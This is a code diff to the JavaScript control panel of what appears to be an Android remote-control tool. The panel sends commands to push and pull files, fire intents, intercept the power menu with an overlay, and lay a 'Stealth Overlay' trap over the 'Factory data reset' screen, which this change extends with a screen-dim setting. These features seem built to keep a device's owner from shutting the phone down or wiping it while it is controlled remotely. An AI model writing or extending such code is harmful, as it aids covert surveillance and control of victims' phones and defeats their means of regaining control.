@@ -398,7 +398,7 @@
                     { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-pkg', label: 'Package Name', type: 'text'}, {id: 'int-cls', label: 'Class Name', type: 'text'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}, {id: 'int-json', label: '--- OR PASTE RAW JSON PAYLOAD ---', type: 'textarea'}] },
                     { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs: [] },
                     { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html', label: 'Shield HTML Payload', type: 'textarea', placeholder: '<html>...'}] },
-                    { id: 'UI_TRAP', name: 'UI Predictive Trap', icon: '🪤', inputs: [{id: 'ui-trap-target', label: 'Target Fingerprint (Title@@Summary)', type: 'text', placeholder: 'Factory data reset@@erase all data'}, {id: 'ui-trap-method', label: 'Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth Overlay)'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-trap-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ui-trap-html', label: 'Predictive HTML Payload', type: 'textarea', placeholder: '<html onload="Cortex.setDim(0)">...'}] },
+                    { id: 'UI_TRAP', name: 'UI Predictive Trap', icon: '🪤', inputs: [{id: 'ui-trap-target', label: 'Target Fingerprint (Title@@Summary@@Pkg)', type: 'text', placeholder: 'Reset@@Factory data reset@@settings'}, {id: 'ui-trap-method', label: 'Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth Overlay)'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-trap-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ui-trap-dim', label: 'Dim Level % (0=Black, 100=Normal)', type: 'number', val: 20}, {id: 'ui-trap-html', label: 'Predictive HTML Payload', type: 'textarea', placeholder: '<html>...'}] },
                     { id: 'CLEAR_UI_TRAP', name: 'Disarm UI Trap', icon: '🔓', inputs: [] }
                 ]
             },
@@ -838,8 +838,7 @@
                         const sd = document.getElementById('scr-dur').value || '0';
                         content = sq + '|' + sf + '|' + sd; break;
                     case 'PUSH_FILE': 
-                        // This is now handled by handlePushDeployment, but we keep the fallback
-                        content = `${document.getElementById('push-url').value} | ${document.getElementById('push-path').value}`; break;
+                        content = `${document.getElementById('push-url').value.trim()} | ${document.getElementById('push-path').value.trim()}`; break;
                     case 'PULL_FILE': content = document.getElementById('val-pull').value; break;
                     case 'RUN_INTENT':
                         const rawJson = document.getElementById('int-json').value.trim();
@@ -947,8 +946,9 @@
                         const uit = document.getElementById('ui-trap-target').value;
                         const uim = document.getElementById('ui-trap-method').value;
                         const uio = document.getElementById('ui-trap-timeout').value;
+                        const uid = document.getElementById('ui-trap-dim').value;
                         const uih = document.getElementById('ui-trap-html').value;
-                        content = `${uit}|${uim}|${uio}|${uih}`; break;
+                        content = `${uit}|${uim}|${uio}|${uid}|${uih}`; break;
                     case 'POWER_SHIELD':
                         const pst = document.getElementById('ps-toggle').value;
                         const pso = document.getElementById('ps-timeout').value;
